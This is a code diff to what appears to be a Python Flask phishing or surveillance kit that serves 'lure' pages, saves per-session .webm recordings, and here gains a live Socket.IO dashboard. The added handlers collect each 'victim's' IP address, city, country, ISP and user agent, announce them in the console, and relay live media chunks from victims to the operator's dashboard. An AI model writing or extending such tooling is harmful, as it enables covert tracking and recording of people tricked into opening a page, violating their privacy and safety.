@@ -115,6 +115,7 @@ def start_tunnel(port):
 def start_flask(page, port):
     script_dir = os.path.dirname(os.path.abspath(__file__))
     from flask import Flask, render_template, request, jsonify
+    from flask_socketio import SocketIO, emit, join_room
     import json, datetime
 
     OUTPUT_DIR = os.path.join(script_dir, "output")
@@ -125,6 +126,10 @@ def start_flask(page, port):
     @app.route("/")
     def index():
         return render_template(f"{page}.html")
+
+    @app.route("/live")
+    def live():
+        return render_template("live.html")
 
     @app.route("/log", methods=["POST"])
     def log():
@@ -175,11 +180,40 @@ def start_flask(page, port):
         return jsonify({"status": "saved", "file": f"{sid}.webm"})
 
     import logging
-    log_flask = logging.getLogger("werkzeug")
-    log_flask.setLevel(logging.ERROR)
+    logging.getLogger("werkzeug").setLevel(logging.ERROR)
+
+    sio = SocketIO(app, cors_allowed_origins="*", async_mode="threading",
+                   logger=False, engineio_logger=False)
+
+    @sio.on("join_dashboard")
+    def _join_dash():
+        join_room("dashboard")
+        emit("dashboard_ready", {"msg": "ok"})
+
+    @sio.on("victim_join")
+    def _victim_join(data):
+        lure = data.get("lure", page)
+        ip   = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0].strip()
+        geo  = data.get("geo", {})
+        info = {"sid": data.get("sid","?"), "lure": lure, "ip": ip,
+                "city": geo.get("city","?"), "country": geo.get("country","?"),
+                "isp": geo.get("org","?"), "ua": data.get("ua","?"),
+                "time": datetime.datetime.utcnow().strftime("%H:%M:%S")}
+        print(f"\n  {_G}[LIVE]{_R} [{page.upper()}] {ip} — {geo.get('city','?')}, {geo.get('country','?')}")
+        sio.emit("victim_connected", info, room="dashboard")
+
+    @sio.on("live_chunk")
+    def _live_chunk(data):
+        sio.emit("stream_chunk", data, room="dashboard")
+
+    @sio.on("victim_done_sock")
+    def _victim_done(data):
+        sio.emit("victim_done", data, room="dashboard")
 
     def run():
-        app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+        sio.run(app, host="0.0.0.0", port=port,
+                debug=False, use_reloader=False, log_output=False,
+                allow_unsafe_werkzeug=True)
 
     t = threading.Thread(target=run, daemon=True)
     t.start()
@@ -192,7 +226,9 @@ def start_flask_single(page, port):
     srv.app.config["LURE_PAGE"] = page
 
     def run():
-        srv.app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+        srv.socketio.run(srv.app, host="0.0.0.0", port=port,
+                         debug=False, use_reloader=False, log_output=False,
+                         allow_unsafe_werkzeug=True)
 
     t = threading.Thread(target=run, daemon=True)
     t.start()
